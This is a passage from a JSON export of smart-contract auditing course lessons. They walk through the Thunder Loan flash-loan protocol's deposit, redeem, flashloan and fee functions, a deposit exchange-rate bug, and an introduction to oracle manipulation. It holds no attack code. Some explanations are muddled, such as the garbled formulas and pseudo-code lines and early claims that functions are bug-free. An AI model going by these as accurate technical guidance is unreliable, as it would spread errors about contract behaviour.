          "markdownContent": "---\ntitle: Thunderloan.sol (Continued)\n---\n\n# Understanding Asset Tokens and Exchange Rates in Thunder Loan\n\nHello coders! In this blog post, we're delving into the world of contracts and tokens. If you're here, you know that asset tokens represent the shares of the pool. But honestly, how many times have we gone over that?\n\nStill, it's crucial to understand that the asset token represents just how much of the contract the whale or depositor actually owns.\n\n## Getting the Asset Token\n\n![](https://cdn.videotap.com/2I1K8YkcCB7hMk6vhMGv-37.2.png)\nTo get the asset token, you simply use `AssetToken get exchange rate`. Here we're getting the exchange rate between USDC (the USD Coin) and the flash loan tokens. The key question here is: what ratio exists between these flash loan tokens and the underlying tokens?\n\n## Minting the Amount\n\nYour mint amount is calculated from the amount deposited, maybe around 100 USDC, times the exchange rate precision times the asset rate. The exchange rate precision usually defaults to `1E 18`.\n\nFor all you math enthusiasts, here's the calculation flow:\n\n```bash\nExchange rate precision = 1E 18100 (deposit amount) x 1E 18 (exchange rate precision) / Exchange rate = Mint amount\n```\n\nIf the exchange rate is 2, then you would have half the flash loan tokens in exchange for the 100 USDC, which stands to reason logically.\n\n> An important point to note here is that we cannot divide by zero in this context. The exchange rate cannot be zero and should preferably always be increasing, never decreasing. If you start at one, it should never decrease to zero due to the way asset tokens are conditioned.\n\n## Emitting the Event\n\nThe role of the event emitter comes into play high up in this process when we call `AssetToken mint`. This is only callable by the Flash Loan investors and passes fine, giving the depositor the mint amount.\n\nInterestingly, when a liquidity provider deposits, the money sits in the asset token contract, not in Thunder Loan. Hence, the money goes directly to the asset token contract.\n\n## Calculating the Fee and Updating Exchange Rate\n\nIn our final stage of the process, the calculated fee is determined using `getCalculatedFee`; this updates the exchange rate and the asset token amount is transferred from message sender to the address of the asset token.\n\nHere's where it could get a little confusing. Why are we calculating the fee of the flash loans at the deposit? And why are we updating the exchange rate?\n\nLet's examine the first issue; our flash loan calculation process goes like this:\n\n```bash\nValue of borrowed token = Amount x getPrice / Fee precisionFee = Value of borrowed token x Flash loan fee / Fee precision\n```\n\nHowever, it's perplexing as to why the fee of the flash loans would be calculated at this juncture in the depositing process.\n\nSecondly, the matter of updating the exchange rate also raises questions. If tokens are deposited, the exchange rate varies. If more is deposited, then what would the exchange rate be? This part seems a little disorienting, definitely warrants a follow-up audit as there may be something off here.\n\nOnce these two issues are addressed, the process should work correctly. The user gets minted some asset tokens and the tokens are then transferred to the underlying.\n\nThere are a few perplexing areas as noted which we look forward to addressing in future posts. Happy coding!\n",
          "updates": []
        },
        {
          "lessonId": "f2a37dbe-b59a-4741-b749-a9a1f05c5d59",
          "number": 31,
          "title": "Diagramming ThunderLoan",
          "slug": "diagramming-thunderloan",
          "folderName": "31-diagramming-thunderloan",
          "description": "",
          "duration": 1,
          "videoUrl": "uRxx2sXvfvMwm63IgNfNtEJIZW8Rr5101ggaObmKTmoM",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/31-diagramming-thunderloan/+page.md",
          "markdownContent": "---\ntitle: Diagramming Thunder Loan\n---\n\n# Understanding the Asset Token Lifecycle: A Deep Dive\n\nLooking at the origin of tokens can sometimes seem like staring into an abyss, especially when one is trying to break down complex DeFi protocols like how an Asset Token comes alive. However, it's not quite as convoluted as you might initially think. Grab a beverage of your choice, strap down and come with me on an exploration of the Asset Token Lifecycle.\n\nFirst, let's get started by laying the schematic foundation, the blueprint of our Asset Token universe. Transitioning thoughts into visuals and diagrams. You know, because a picture says a thousand words right?\n\n## The Basic Anatomy of the Asset Token\n\n![](https://cdn.videotap.com/2sWH0NEKSYYOOCz3JhNl-7.47.png)\n\nAn essential part of the Asset Token lifecycle begins with the liquidity provider (LP), who owns USDC. As a first step, the LP 'calls deposit' to kickstart this entire process. The underlying USDC is sent to the asset token (Say, Asset Token A or USDC) during this deposit process.\n\n> _The deposit kickstarts the process, triggering a transaction into the Asset Token._\n\nAt this stage, the contract governing the Asset Token is crucial. This contract plays the role of a storehouse, a vault that holds and secures the underlying USD.\n\n## Asset Token Orchestrating Transactions\n\nOur adventure into the Asset Token Lifecycle takes us deep into the heart of interactions and transactions between different entities. The USDC held by the liquidity provider is sent over to the Asset Token post the deposit call. But that's not where the transactions stop.\n\nFinally, the Asset Token mint machine kicks into gear. The asset token mints the LP an equivalent amount of the underlying USD, following the deposit and storage of USDC. Seem complex? Let's simplify with a diagram!\n\n![](https://cdn.videotap.com/2jNGLhZwIkTe4vPJr8UC-24.27.png)\n\nHere's how the transaction process goes:\n\n1. The LP owns USDC.\n2. The LP calls deposit, signaling intent to transition the USDC into an Asset Token.\n3. This deposit triggers a sequence where the USDC moves from the LP to the Asset Token.\n4. Once the USDC is in the Asset Token, the Asset Token mints an LP against the equivalent USDC.\n\nBy reaching this point, we've successfully navigated the murky waters of the Asset Token lifecycle, from deposit call to minting of the LP. This journey underscoring the power of decentralized finance offers valuable insight into the ecosystem. But there's so much more to explore - start digging deeper into contract calls, consensus algorithms and tokenomics right now!\n\nIn our opening diagram and explanation, the statements might seem broad or oversimplified â€“ that is far from the case! Each step occurs in a well-defined, precision-driven process. It's a well-oiled machine, offering insights into the unseen side of token generation and distribution. We shall continue to dissect further and reveal more layers to this 'simple' transaction as we move ahead.\n",
          "updates": []
        },
        {
          "lessonId": "8fd6d0f7-584f-4553-a0c0-13843171df18",
          "number": 32,
          "title": "ThunderLoan Redeem",
          "slug": "thunderloan-redeem",
          "folderName": "32-thunderloan-redeem",
          "description": "",
          "duration": 5,
          "videoUrl": "UDidaP003wldQY55X99EvQ02723BGqVBOFtx5Ez024NNaw",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/32-thunderloan-redeem/+page.md",
          "markdownContent": "---\ntitle: Thunderloan.sol - Redeem\n---\n\n# How to Deposit and Redeem Asset Tokens: A Deep Dive into Blockchain Functions\n\nWelcome back to the world of token functions! Today, we're going to dive deep into deposit and redeem functions in a blockchain-based system. Strap in!\n\n## Diving into the 'Deposit' Function\n\nFirst, let's revisit the `deposit` function. This function allows a user to deposit an underlying token in exchange for an asset token. In essence, the user puts their underlying token into the pool and receives the equivalent amount of asset tokens in return. We may return to it later, but it's critical to understand this function before we dig deeper into the `redeem`.\n\n## Understanding the 'Redeem' Function\n\n![](https://cdn.videotap.com/PFna6Zl1YqUpuTWXUXwx-48.27.png)\n\nMoving on, the `redeem` function plays the opposite role. Where the `deposit` function pulls in an underlying token, the `redeem` function withdraws the underlying token from the asset token. When using this function, we must specify the token from which we want to withdraw, and how much therein we want to withdraw.\n\n#### The Token Ambiguity\n\nAt this point, you might be wondering - does \"token\" refer to the asset token or the underlying token? After a detailed scrutiny, we confirmed that it refers to the actual token to be withdrawn, not the asset token.\n\n![](https://cdn.videotap.com/ez1kq5fAGd1OgsIQfDqE-86.88.png)\n\nComing back to our code, we need to determine the exact asset token to withdraw (let's call it the 'actual asset token'). We have a revert of zero if the token is not allowed to be withdrawn, thus eliminating any unauthorized tokens.\n\n#### On User Experience and Exchange Rates\n\nThis code incorporates an eye for user experience. If the amount equals the maximum, the contract returns the balance of asset tokens for the address (or 'message sender'). This function essentially lets a user say, \"I have ten asset tokens for USDC, I want USDC equivalent to these ten tokens.\" And our function does exactly this.\n\n![](https://cdn.videotap.com/54JcHcJspGCdA0pezifC-125.5.png)\n\nThe maths underline the code logic:\n\n```javascript\namount_underlying =\n  (amount_of_asset_token * exchange_rate) / asset_token_exchange_rate_precision;\n```\n\nThis takes into account the precision of the exchange rate - if the user wants `1 E 18` and the exchange rate is `1 E 18`, dividing by `1 E 18` would yield a `1 E 18` back.\n\nThe function then emits a `redeemed` event and calls `assetsBurn` to burn the asset tokens from the user's holdings. This mirrors the process of deposit, but in reverse: where deposit multiplied the precision by the exchange rate, this instead multiplies the exchange rate by the precision.\n\n#### Handling Weird ERC 20 Tokens\n\nLooking at it from the outside, everything seems to be falling into place. But what if we're dealing with a non-standard ERC 20 token? Let's consider `USDT`, which has six decimals instead of eighteen (thus being referred to as a 'weirdo'). Would the equation still hold? After some calculations and investigations, we found that it does!\n\n![](https://cdn.videotap.com/jWxqkTW1E5Jz4AjmtCqu-202.73.png)\n\nThe redeem function came out looking pretty solid. There was no apparent issue with re-entry and it seemed to follow \"Checks-Effects-Interactions\" (CEI) principle, where it checks upfront, performs certain effects, and then carries out any required interactions. DEI is a widely-accepted guideline in Ethereum community to avoid common issues such as reentrancy attacks.\n\nWith `redeem` function now in tow, we have two important functions - `deposit` and `redeem` - both seemingly bug-free.\n\n![](https://cdn.videotap.com/nNvbG3E0OfsqbxJORxX2-231.69.png)\n\nIn conclusion, while blockchain functions like `deposit` and `redeem` can look complicated, breaking them down and understanding what each element does turns these seemingly convoluted calculations into understandable steps. As with anything in blockchain, the devil is in the detail - and it's safe to say we've captured all of them here. Stay tuned for more deep dives into the world of blockchain functions!\n",
          "updates": []
        },
        {
          "lessonId": "bca8e64a-09ac-40e0-a723-f0100b143e4d",
          "number": 33,
          "title": "ThunderLoan Flashloan",
          "slug": "thunderloan-flashloan",
          "folderName": "33-thunderloan-flashloan",
          "description": "",
          "duration": 14,
          "videoUrl": "mIat702o8cYQBwwz9jQMIXOO855n02G2sn26Wu9wwQFmQ",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/33-thunderloan-flashloan/+page.md",
          "markdownContent": "---\ntitle: Thunderloan.sol - Flashloan\n---\n\n# Understanding the Flash Loan Function\n\nIn reviewing, understanding, and working with the flash loan function in a smart contract, I encountered a few challenges due to the lack of a Nat Spec. But fear not, in this blog post, we'll walk through it, figure out what each parameter does, and build the Nat Spec ourselves.\n\n## Decoding the Parameters\n\n![](https://cdn.videotap.com/70D5PzXZylGPTZ8Ak7ea-44.44.png)\n\nThe main parameters in the flash loan function are:\n\n- Receiver address : This is probably the address that should receive the flash-loaned tokens, essentially, where to send the borrowed tokens.\n- ERC 20 : This is the token you want to borrow.\n- Amount : Obviously, this would be the amount you want to borrow.\n- Params : These are the function call parameters for the receiver address. Meaning, when the flash loan function sends the tokens to the receiver address, it will also send these parameters. It is important to note here that the receiver address is expected to be a smart contract.\n\n## Function Breakdown\n\nTo get a better understanding, we should examine each line of the function.\n\n```\nrevert is 0;revert if not allowed token;\n```\n\nWhile these lines may seem perplexing, they are simple checks, the first is to ensure that the function does not revert right out of the gate and the second verifies that the token is allowed. To understand this, you can look into the `isAllowedToken()` function.\n\n```\nAsset token = s_2 asset token of the token.\n```\n\nHere, `assetToken` is the contract that holds the underlying tokens we want to borrow.\n\nA critical part of the function is getting the `startingBalance` of the asset token contract, which will come in handy later on when we verify if the flash loan has been repaid.\n\nIf the `amount` to borrow is more than the `startingBalance`, it means that the function is trying to borrow more than the total available tokens, and it will resultantly revert and terminate the operation.\n\nIn addition to the checks mentioned above, the function verifies the code length of the receiver address. If it equals zero, the operation is once again reverted.\n\n## Understanding the Fees\n\n![](https://cdn.videotap.com/nrDYkgtsrD1YCbh5GO4J-474.07.png)One thing that might seem confusing initially is how they calculate the fee. `getCalculatedFee()` is the function that gets used for that. It's important to note that this fee is the contract's charge to facilitate the flash loan operation.\n\nTo make more sense of this, it's useful to go back to this line:\n\n```\nAssetToken.updateExchangeRate (fee)\n```\n\nHere, the `updateExchangeRate` of the `AssetToken` contract is getting updated with the `fee`. In essence, this step ensures the protocol updates the exchange rate so that everything adds up mathematically with the introduction of the new fee.\n\n> It's important to pause here and do some quick math to fully grasp the impact of the fee on the exchange rate.\n\n## The Flash Loan in Action\n\n![](https://cdn.videotap.com/m50tzcSXOfTUOdDNWqXL-622.22.png)Now that we have understood what each parameter does, we can actually do a quick run-through of the function. Here are the steps:\n\n- The user calls the flash loan requesting for a specific amount of a specific ERC20 token.\n- The function verifies the code length of the receiver address and the amount of the requested token, checks the starting balance of the underlying asset token contract, and verifies if the flash loan has been repaid.\n- If all checks out, the necessary amount of tokens are transferred to the receiver address via `AssetToken.transferUnderlyingTo()`.\n- The function interface calls the `executeOperation` of the receiver contract using the provided params for further operations.\n- Ultimately, it expects the receiver contract to call the `repay` function, sending back the borrowed amount plus the fee.\n\n## Conclusion\n\nWalking through this function sheds light on how a flash loan function works in conjunction with other pieces of a smart contract. However, it's always critical to do your own due diligence and research, check out how other protocols implement similar functionalities, and learn from existing work.\n\nHappy coding!\n",
          "updates": []
        },
        {
          "lessonId": "cc8b39c4-b859-4c01-a12a-45e910bac4bf",
          "number": 34,
          "title": "Note On Being Discouraged",
          "slug": "note-on-being-discouraged",
          "folderName": "34-note-on-being-discouraged",
          "description": "",
          "duration": 1,
          "videoUrl": "hOBNkY3LshFw5mv9WRuS61yKT477CvLgoPFeV6yzsIw",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/34-note-on-being-discouraged/+page.md",
          "markdownContent": "---\ntitle: A Note On Being Discouraged During The Audit Process\n---\n\n# Understanding the Complexity of Codebase Audits: An In-Depth Exploration\n\nIn the world of coding, auditing your codebase is akin to a treasure hunt. Only in this case, the treasure isn't chests of gold and diamonds, but issues and flaws that need to be addressed. Itâ€™s a crucial process for maintaining code quality and ensuring your app's security. At times, the search can appear discouraging, especially when a clear solution or bug isn't immediately evident. This blog post will dive into the complex world of codebase audits and why it may sometimes feel like you're going around in circles, even though youâ€™re on the right track.\n\n![](https://cdn.videotap.com/zCv8VBC70weROS4c3wJa-1.69.png)## Unraveling the Codebase: Do You Have Any Audit Highs?\n\nHaving reached this point, you're likely deep into your codebase, scanning various components and notes, and your eyes may have become glossed over with `SRC` entries. Youâ€™ve probably posed the question â€œDo we have any audit highs?â€\n\nThere's no sugarcoating it: learning that you haven't unearthed any 'high' flag issues may feel deflating. After all, youâ€™re searching for bugs that pose serious risk and, logically, finding a higher risk issue means youâ€™re making progress, right? Unfortunately, this reasoning skips a very important point: security reviews are not linear.\n\nIt's not as simple as starting at Point A and proceeding seamlessly to Point B. Sometimes, you only find small, lower-risk issues. Sometimes, you hit a wall. And occasionally, you find exactly what you've been looking for.\n\n## Perseverance is Key: Addressing Absence of Medium-category Issues\n\nThe feeling of dismay might deepen when you move to the next level - the medium-category issues, only to discover a similar scenario â€“ no apparent bugs. These mid-level issues often provide a balance between complexity and harm potential, making them valuable finds during the audit process.\n\nThe very absence of any high or medium level issues might make you question - â€œWhat's going on?â€\n\nAnd this is where the answer starts to become apparent.\n\n> **Remember, security reviews are not linear.**\n\n## The Non-linear Nature of Security Audits\n\nJust as with any code review, a ton of questions may spring up, some of which will remain unanswered. Within these mysteries could be hidden the very bugs you seek. You might have already spotted some bugs but dismissed them because they didn't fit into the 'high' or 'medium' categories you were actively searching for.\n\nThatâ€™s why itâ€™s so important to remember that path isn't a straight line. It might feel like you're going in circles, but each review, each question asked, and each bug found is a step forward.\n\nRemember, itâ€™s not about high or medium issues; it's about the hunt for irregularities that can compromise your application's security. Itâ€™s arduous and often tedious, but that doesnâ€™t mean youâ€™re not making strides. Every time you cycle through your code, peering at it from all angles, you're gaining a broader perspective and understanding of how your codebase functions.\n\n## Conclusion: Keep Going\n\nSo, next time you find yourself wrapped up in a painstaking codebase audit, donâ€™t be discouraged if youâ€™re not finding high or medium issues. Remember the nature of security reviewsâ€”they are complex, they are multifaceted, and they are definitely not linear.\n\nKeep going, keep searching, and trust that while the path may seem winding and peppered with dead ends, it is leading you to a more robust and secure codebase.\n",
          "updates": []
        },
        {
          "lessonId": "177ebf9d-fe5d-40e0-9892-5757986d60ff",
          "number": 35,
          "title": "ThunderLoan Repay Final Functions",
          "slug": "thunderloan-repay-final-functions",
          "folderName": "35-thunderloan-repay-final-functions",
          "description": "",
          "duration": 8,
          "videoUrl": "Ee00dg01KILGC00j6gt18HujZeTD952asb5VyFl01L6Tt2A",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/35-thunderloan-repay-final-functions/+page.md",
          "markdownContent": "---\ntitle: Thunderloan.sol - Repay and Final Functions\n---\n\nTitle: Simplifying Cryptocurrency - Understanding and Breaking Down the Repay Function on Thunder Loan Contracts\n\nWelcome to the intriguing world of Thunder loan contracts! Today, we'll dive into the complexities of the repay function and how it fits into the broader cryptosphere.\n\n## Repay Function: An Overview\n\nYou may wonder why users are expected to use this foundation of Thunder loan contracts. The repay function could be termed a helper function as it essentially facilitates the transfer of tokens from the message sender to the asset token.You could choose to use this function or proceed with a direct transfer.\n\n![](https://cdn.videotap.com/clirVfwioc458w6aVh7V-53.02.png)> _Quick Note:_ Direct transfers can be initiated by simply calling the transfer function and then directing tokens to the asset.\n\nIn our evaluation, the repay function passed the net spec check with flying colors. It contributes significantly to the handling of allowed tokens in the contract.\n\n## Decoding getCalculatedFee\n\nOne question that is often asked is whether this function calculates the fees of the flash loan. To answer this straightforwardly, yes, it does! The getCalculatedFee function appears not only in the flash loan but is also utilized in the deposit aspect.\n\n![](https://cdn.videotap.com/6mvrIM7OsjoztStUZ3t8-127.26.png)\n\nIn terms of decision-making, the question now arises: how does getCalculatedFee calculate the fee?\n\nIn simple words, it first gets the value of the borrowed token by multiplying the amount by the price in WETH. Importantly, this is sourced from the Oracle upgradable getPriceInWETH, which in turn uses the TSWAP Oracle to calculate the value of the borrowed token.\n\nThe 'flash loan fee,' then calculated, divides the calculated value by some fee precision. From here, it applies a 0.3% fee based on the value of the token rather than the actual token amount.\n\n## Digging Deeper\n\nIn delving into the code, we find that getPriceInWETH derives the price of one pool token in WETH.\n\n![](https://cdn.videotap.com/jZtPSFvT2rr7Jszw6QmJ-286.33.png)\n\nFirstly, it's important to revisit TSWAP to further understand this function, particularly how it calculates the amount based on input and output reserves. It raises a potential area of concern. Within an auditing context, we could ask:\"What if the token has six decimals? Would it then distort the price calculation?\"\n\n> _Critical Outlook:_ Ignoring token decimals could result in inaccurate price calculations, especially when working on the basis of TSWAP decks for determining the flash loan fee.\n\nWhile this looks plausible, it may still not be entirely correct. Circumspection is needed at this point, and we would do well to return and probe further.\n\n## Addressing Minor Questions\n\nAfter reviewing the functions like updateFlashLoanFee, isAllowedToken, and getAssetFromToken, we now move on to view functions. The authorizeUpgrade function is particularly interesting as it underlines why we ought to understand proxies in detailed terms.\n\n![](https://cdn.videotap.com/xKIHOvSLAXgodeugEkw9-381.77.png)\n\nIn essence, adding the _only owner_ stipulation in the authorized upgrade function restricts contract upgrades to the owner alone. Take away this extra layer, and you throw open the door to anyone upgrading the contract!\n\nIn conclusion, our initial pass through the Thunder Loan contracts codebase may not have uncovered any distinct issues. But it certainly has left us with questions that need answering, and thatâ€™s where the real fun begins!\n\n## Onwards and Upwards\n\nCracking the code behind algorithms in the cryptosphere may seem incredibly daunting. But remember that the key lies in taking one step at a time, going back to your questions, and digging deeper to find the answers.\n\n![](https://cdn.videotap.com/SeBnhlFpXSRHJX757F1r-434.79.png)\n\nJoin us in our next post for a further breakdown of these questions â€“ who knows, we might uncover new insights in our exploration of Thunder Loan contracts. Until then, happy coding!\n",
          "updates": []
        },
        {
          "lessonId": "59f203cb-1a3d-4aa0-86a2-4cd7faaf1785",
          "number": 36,
          "title": "Answering Our Questions",
          "slug": "answering-our-questions",
          "folderName": "36-answering-our-questions",
          "description": "",
          "duration": 9,
          "videoUrl": "4oCBj00yM8y8cNhVqZdHkFscX8kceq2I101aCKxCrKgYA",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/36-answering-our-questions/+page.md",
          "markdownContent": "---\ntitle: Answering Our Questions\n---\n\n---\n\n# A Deep Dive into T-SWAP: Unpacking Questions and Bugs\n\nIn our exploration of the intricate protocol called T-SWAP, we're going to be asking some hard questions and unraveling complex aspects. The key thing about crypto dApps is you need to understand their working down to the bare-bones in order to exploit or protect against potential vulnerabilities.\n\nTo make the exercise simple, we will treat the hard-hitting questions as dialogue, with each question and answer followed by a quick analysis or piece of advice.\n\nLet's jump in.\n\n## Q1: Why are we using T-SWAP?\n\nWe're using T-SWAP to get the value of a token so that we can calculate fees. Sounds simple enough, right? However, this leads us to another question.\n\n## Q2: Why are we only using the price of a pool token in WETH (Wrapped Ethereum)?\n\nThis is the part that may sound a bit odd. Why are we getting the price in WETH when our primary objective is the price of the token? We're using this pricing in `calculateFee` or `getCalculatedFee`. This calls the `getPriceInWETH`, but for a scenario where we have a flash loan, it's not making much sense.\n\n![](https://cdn.videotap.com/Ko9tuGIzxt2a7EKvdpiz-189.39.png)\n\n\"If we intended to get the price in WETH then the fee should probably be in WETH,\" I hear you say. And you're right. This `getCalculatedFee` seems off. How can one USDC plus 0.3 USDC make sense when the fees are being calculated using `getPriceInWETH`? This could be a potential bug in the software.\n\nAt this juncture, we must determine the impact and likelihood of this bug.\n\n## Potential Bugs in Fee Calculation\n\nFirst off, let me assure you - we're not expecting you to grasp everything the first time around. Crypto security is rife with quirky implementations that some might consider \"weird wonkiness.\"\n\nHere's what we're dealing with - Whenever a fee gets calculated, it uses this potentially flawed method. If this is not the intended functionality, that's a problem! The audit likelihood might be high, leading to a 'medium to severe disruption of the protocol' and the impact could be either medium or high.\n\n> **Quote:** \"If the fee is going to be in the token, then the value should reflect that. But in current scenario it's super weird. We're getting the value of the borrowed token in units of WETH, and we're increasing the fee in units of WETH and USDC.\n\n## Q3: Weird ERC20s with USDC\n\nNow, let's move onto the next question. What if USDC blacklists the loan contract? USDC is behind a proxy and could be upgraded anytime, which could potentially 'wreck' the protocol. This could lead to a freeze on the whole protocol. This is crucial to discuss in private or competitive audit.\n\nBut remember, the rules in competitive audits _usually_ are: 'if a user is denied service or removed, too bad. However, if a user's denial affects others, that's usually an accepted finding in a competitive audit'.\n\nIn case of ERC20s, in competitive audits, these are often not considered valid findings. Sure, you need to keep the clients aware in a private audit, but competitive audits call for more pressing issues. We'll rate this an audit medium, maybe an audit low.\n\n## Q4: Decimals with Token - Can the Price be Wrong?\n\nNow, this is an intriguing aspect. Please note that for this blog, we're going to skip over this question. But here's a challenge to you, the reader, if you think you can answer it better: If a token is characterized by weird and different decimals, can the price be wrong?\n\nHere's a nugget of wisdom: Always be thinking about these types of things. Find out if you can break the protocol by using weird tokens with weird decimals.\n\n## Q5: Is `feePrecision` Misplaced?\n\nThis code deep dive also raises the audit question on whether the `feePrecision` value, which is currently a storage variable, could be better served as a constant immutable.\n\nThat covers some of our perplexing questions about T-SWAP, and we've unfortunately stumbled upon a few potential bugs! But hey, it's better to discover them now in an audit than later when the damage could be far more considerable.\n\nThe key takeaway from this exploration is the importance of meticulous analysis during crypto dApp development. Every piece of code should be audited carefully to ensure it's bug-free and works as intended.\n\nI hope this blog enriched your knowledge about potential pitfalls and the need for audacious questions during protocol designing process.\n\nRemember, in the complex world of crypto, curiosity doesn't kill the cat; complacency does!\n",
          "updates": []
        },
        {
          "lessonId": "7246ca88-7397-43b7-9500-87bb15eafa70",
          "number": 37,
          "title": "Improving Test Coverage To Find A High",
          "slug": "improving-test-coverage-to-find-a-high",
          "folderName": "37-improving-test-coverage-to-find-a-high",
          "description": "",
          "duration": 16,
          "videoUrl": "02CWQ02hUiGoFVcMcbSN00LUYOtzjbmQjC4FXWTa859bvQ",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/37-improving-test-coverage-to-find-a-high/+page.md",
          "markdownContent": "---\ntitle: Improving Test Coverage To Find A High\n---\n\n# Unraveling the Mystery: Decoding Flash Loan Fees and Exchange Rate Updates\n\nAs we delve deeper into the complexities of DeFi protocols, we find ourselves constantly asking - Why? Why are we calculating the fees of a flash loan in the deposit? And why are we updating the exchange rate? Isn't it a bit strange to perform these updates here?\n\nTo unravel this puzzle, we embarked on an audit trail that led to some unexpected discoveries and revelations.\n\n## Deciphering the Problem: Understanding Exchange Rates and Flash Loans\n\nThe first oddity we noticed was the update of the exchange rate in the deposit function when adding fees. This process typically only commences when there's a significant increase in the total amount of money in the asset token. It seemed illogical that the deposit function, which accrued no fees, was responsible for this update.\n\nIf the update exchange rate was malfunctioning, it would have repercussions on the 'redeem' function - our protocol's withdrawal mechanism. To confirm our suspicions, we needed to test this function first.\n\n## Running the Test: Examining the 'Redeem' Function\n\nTo validate the functionality of the redeem function, we had to initiate a test. We decided to write a test for the redeem function and simulate a scenario of borrowing from the test flash loan and then attempt to redeem.\n\nWe commenced with the test by first setting up a mock Flash Loan receiver with a specified fee, which would be used for the Flash Loan.\n\nThe test would first change the exchange rate by depositing some funds, then modify it again by initializing the Flash Loan. ideally, at this stage, the depositor should be able to withdraw all their money.\n\n![](https://cdn.videotap.com/NHVntHvDBDp2yLjdahS4-377.57.png)\n\n## The Unexpected Revelation: Insufficient Balance\n\nThe test, unfortunately, produced an unexpected outcome - Insufficient balance.\n\nAfter analyzing the logs of the transactions performed during the test, we noticed that the 'transferUnderlyingTo' function was returning an error stating insufficient funds. The amount to be transferred back (1003 tokens) was higher than the initial deposit (1000E 18).\n\nThis discrepancy threw us off balance. We had triggered a Flash loan, and expected to incur a fee, but the increase in the withdrawal amount surpassed the fee incurred. Upon scrutinizing the deposit function once again, we discovered an uncanny occurrence - the exchange rate was updating the fee.\n\nThe exchange rate, which was originally responsible for tracking the total amount of money in the protocol at all times, had now charged a fee without any transaction taking place.\n\nThis detrimental coding error was affecting liquidity providers' ability to redeem their tokens, setting off alarm bells for us.\n\n## Assessing the Damage: Decoding the High\n\nTo ascertain the gravity of the impact of this error, we performed a follow-up test with the problematic lines of code in the Thunder loan commented out. As expected, the test passed, solidifying our suspicion. The initial mock test we developed served as a proof of code that affirmed our findings.\n\n![](https://cdn.videotap.com/liERWQdBJtLyf0Oj21Oc-556.43.png)\n\nThe paramount error was evident - the erroneous exchange rate update in the deposit function. This update was blocking redemptions and incorrectly setting the exchange rate, leading to severe disruptions in the contract functionality.\n\nThe likelihood of this recurring was high due to its occurrence every time someone deposited. The impact, too, was high as users' funds would be locked. Moreover, rewards were incorrectly calculated due to reward manipulation leading to users potentially getting way more or less than deserved.\n\n## Mitigating the Threat: Towards a Safer Protocol\n\nHaving extensive experience in blockchain security, we carefully devised a countermeasure to neutralize this imminent threat.\n\nThrough our persistent efforts probing into the code, we have managed to reveal a glaring irregularity that could have potentially endangered the whole protocol. The mandatory removal of this erroneous exchange rate update from the deposit function could significantly impact the protocol, making it safer and more secure, offering a fortifying solution to this daunting mishap.\n\nAnd, as we continue ahead in our journey, probing for more security vulnerabilities and solving them, we learn that most bugs tend to surface towards the end of the audit. As our understanding of the protocol deepens, we get better at detecting potential threats, eventually leading to a more secure eco-system for all.\n",
          "updates": []
        },
        {
          "lessonId": "8564f658-ef5f-4c3f-9f4b-9cb564b5f609",
          "number": 38,
          "title": "Exploit: Oracle Manipulation",
          "slug": "exploit-oracle-manipulation-intro",
          "folderName": "38-exploit-oracle-manipulation-intro",
          "description": "",
          "duration": 2,
          "videoUrl": "2xZ01jBXrDLTsaU01q1GTXGd00DlAlDDq64RfC4RB1iMe8",
          "rawMarkdownUrl": "/routes/security/6-thunder-loan/38-exploit-oracle-manipulation-intro/+page.md",
          "markdownContent": "---\ntitle: Exploit - Oracle Manipulation - Introduction\n---\n\n# The Art of Debugging: A Deep Dive into Oracle Manipulation\n\nHello Code Lovers! We're back with another exciting and intriguing chapter of our journey today. So, keep your curiosity alive as we have some complex but fascinating issues to untangle.\n\n## Unravelling the Mystery: Deleting a Mapping\n\nFirst things first â€“ let's delve into one compelling question that's been troubling us: Does deleting a mapping work? Remember, the key to successful debugging is not just fixing the bug, but comprehending the reason behind it.\n\nAfter a thorough examination, we did come across some irregularities earlier. But with our renewed focus, let's try to unlock this puzzle.\n\n![](https://cdn.videotap.com/EDZ935DJCvseMdojYDqQ-15.74.png)\n\n## Decoding the Fee Calculation Conundrum\n\nMoving on to another important question: How does the fee get calculated? Now, if you'll recall from our previous discussion, we uncovered some strange issues concerning the fee represented in the token.\n\nWithout getting bogged down by the past problems, let's scrutinize if there's a deeper complication here, especially with the usage of T-SWAP as the protocol.\n\nOn a side note, this is an instance where the wisdom derived from previous experience comes into play. It's essentially when debugging starts resembling a thrilling treasure hunt - the more treasures (read: issues) you uncover, the more experienced and capable you become.\n\nSo, roll up your sleeves as we uncover a grave inconsistency embedded in the depths of this code.\n\n![](https://cdn.videotap.com/ILyKyCIUBPHesdezqO7A-34.63.png)\n\n## The Hidden Dragon: Oracle Manipulation Issues with AMM\n\nAs we delve deeper, there's a staggering hiccup with using the reserves of a Decentralized Exchange (DEX) or an Automated Market Maker (AMM), like TSwap. Did you know the reserves' modification could drastically alter the price, thus jeopardizing the entire protocol?\n\nConsider, for instance,If you could alter the reserves in TSwap, it, in turn, alters the price and disrupts the entire protocol.\n\nThis brings us to our next cornerstone - understanding Oracle Manipulation, to determine any potential malfunctions leading to a breach.\n\n![](https://cdn.videotap.com/Dq8ETmltBDcUUQFSFh4o-56.67.png)\n\n## Oracle Manipulation: Spotting the #1 Attack Vector of 2023\n\nThere's a critical question to address here: What's the likelihood of a breakdown? And if it exists, can it expose the system to potential hacks?\n\nIf you're in tune with the trends, then you most certainly know that Price Oracle Manipulation topped the list of attack vectors for the first half of 2023. It's essential to have a clear understanding of how it operates, how to steer clear of it and, most importantly, spotting this concern.\n\nUnfortunately, the problem is commonplace in competitive audits, private audits, and also manifests \"in the wild.\"\n\nLet's delve into this vast sea of knowledge, which may seem intimidating for beginners but indeed holds the key to amending this widespread issue.\n\n![](https://cdn.videotap.com/DFzBDvQKrlAS9RSlOvGX-75.56.png)\n\n## In Conclusion\n\nSo let's start snowballing now and romp through this course! Debugging and solving these issues will give you a giddy sense of accomplishment. More importantly, learning to identify these potential landmines can equip you to deal with an array of daunting challenges in your coding journey. Happy Debugging!\n",
          "updates": []
        },
        {
          "lessonId": "ec5a245b-0240-4ebe-8389-35259b0e7af7",
          "number": 39,
          "title": "Oracle Manipulation: Minimized",
          "slug": "exploit-oracle-manipulation-minimized",
          "folderName": "39-exploit-oracle-manipulation-minimized",
          "description": "",
          "duration": 10,
          "videoUrl": "q4GhJAaGGAGtpuGbtE6jrfwZWH00wO701PHNn67Bdz99M",
